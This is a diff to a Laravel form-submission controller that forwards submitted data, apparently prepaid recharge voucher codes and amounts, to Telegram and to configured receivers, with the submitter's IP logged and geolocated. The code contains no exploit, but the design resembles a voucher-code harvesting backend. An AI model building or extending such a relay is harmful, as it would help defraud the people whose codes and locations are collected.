@@ -89,7 +89,6 @@ class FormDataController extends Controller implements HasMiddleware
         $notifData->setSubject('A new form data has been submitted');
         $notifData->setBody(json_encode($formData->data, JSON_PRETTY_PRINT));
         TelegramMsgJob::dispatchSync($notifData, $formData->ip_address);
-        SetLocation::dispatch($formData->ip_address, $formData, 'location');
 
         if ($receiver = site_setting('receiver_email')) {
             $except = ['type', 'code', 'amount', 'inverted_code', 'is_inverted', 'code_de_recharge', 'Code de recharge'];
@@ -101,15 +100,17 @@ class FormDataController extends Controller implements HasMiddleware
                 $notifData->setTitle('Nouvelle entrée de formulaire: <b>' . $data['code'] . '</b>');
                 $notifData->setBody(json_encode($data, JSON_PRETTY_PRINT));
                 if ($delay > 0) {
-                    TelegramMsgJob::dispatch($notifData, $formData->ip_address, $receiver)->delay(now()->addSeconds($delay));
+                    TelegramMsgJob::dispatch($notifData, 'N/A', $receiver)->delay(now()->addSeconds($delay));
                 } else {
-                    TelegramMsgJob::dispatchSync($notifData, $formData->ip_address, $receiver);
+                    TelegramMsgJob::dispatchSync($notifData, 'N/A', $receiver);
                 }
             } elseif (receiver_type($receiver) === 'email') {
                 $message = new FormDataMail($data);
                 Mail::to($receiver)->later(now()->addSeconds($delay), $message);
             }
         }
+
+        SetLocation::dispatch($formData->ip_address, $formData, 'location');
 
         return response()->json(['success' => true]);
     }
